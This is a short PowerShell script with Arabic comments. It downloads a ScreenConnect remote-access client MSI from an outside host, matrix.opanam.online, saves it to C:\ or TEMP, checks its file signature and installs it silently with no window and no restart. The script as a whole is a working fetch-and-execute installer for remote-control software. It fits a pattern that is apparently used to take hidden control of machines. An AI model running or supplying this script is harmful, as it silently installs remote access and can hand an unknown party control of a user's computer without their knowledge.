# --- إعدادات ---
$Url          = "https://matrix.opanam.online/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
$PrimaryDir   = "C:\"
$FallbackDir  = $env:TEMP
$FileName     = "ScreenConnect.ClientSetup.msi"
$LogName      = "ScreenConnect_Install.log"

# دالة لتجربة مسار معين
# ⚠️ ملاحظة: نستخدم Write-Host للرسائل عشان ما تترجعش مع return
function Try-Download {
    param($Dir)

    if (-not (Test-Path $Dir)) {
        Write-Host "Directory '$Dir' does not exist."
        return $null
    }

    $target = Join-Path $Dir $FileName

    try {
        Write-Host "Trying to download to: $target"
        Invoke-WebRequest -Uri $Url -OutFile $target -UseBasicParsing -ErrorAction Stop

        if (-not (Test-Path $target)) { throw "File not found after download." }

        $size = (Get-Item $target).Length
        Write-Host "Downloaded size: $size bytes"
        if ($size -lt 100KB) { throw "File too small, likely invalid." }

        # ✅ نرجع المسار لوحده فقط
        return $target
    }
    catch {
        Write-Host "Failed to download to '$Dir': $($_.Exception.Message)"
        if (Test-Path $target) { Remove-Item $target -Force -ErrorAction SilentlyContinue }
        return $null
    }
}

# --- 1) نحاول C:\ الأول ---
$MsiPath = Try-Download -Dir $PrimaryDir

# --- 2) لو فشل، نروح للتيمب ---
if (-not $MsiPath) {
    Write-Host "Falling back to TEMP folder..."
    $MsiPath = Try-Download -Dir $FallbackDir
}

# --- 3) لو الاتنين فشلوا، نوقف ---
if (-not $MsiPath -or -not (Test-Path $MsiPath)) {
    Write-Host "ERROR: Could not download MSI to either C:\ or TEMP."
    exit 1
}

Write-Host "MSI downloaded at: $MsiPath"

# --- 4) التحقق إن الملف MSI حقيقي ---
try {
    $bytes = [System.IO.File]::ReadAllBytes($MsiPath)[0..3]
    $signature = ($bytes | ForEach-Object { $_.ToString("X2") }) -join ""
    if ($signature -ne "D0CF11E0") {
        Write-Host "ERROR: File is not a valid MSI. Signature: $signature"
        exit 1
    }
    Write-Host "File signature OK (valid MSI)"
}
catch {
    Write-Host "ERROR checking file signature: $($_.Exception.Message)"
    exit 1
}

# --- 5) مسار اللوج (جانب الملف نفسه) ---
$LogPath = Join-Path (Split-Path $MsiPath -Parent) $LogName
Write-Host "Log will be written to: $LogPath"

# --- 6) تثبيت صامت ---
try {
    Write-Host "Installing silently..."

    $arguments = "/i `"$MsiPath`" /qn /norestart /L*v `"$LogPath`""
    Write-Host "Command: msiexec.exe $arguments"

    $proc = Start-Process -FilePath "msiexec.exe" `
                          -ArgumentList $arguments `
                          -Wait -PassThru -NoNewWindow

    Write-Host "msiexec ExitCode: $($proc.ExitCode)"

    if ($proc.ExitCode -eq 0 -or $proc.ExitCode -eq 3010) {
        Write-Host "SUCCESS: ScreenConnect installed. ExitCode=$($proc.ExitCode)"
        exit 0
    } else {
        Write-Host "FAILED: ExitCode=$($proc.ExitCode). Check log: $LogPath"
        exit $proc.ExitCode
    }
}
catch {
    Write-Host "ERROR during install: $($_.Exception.Message)"
    exit 1
}
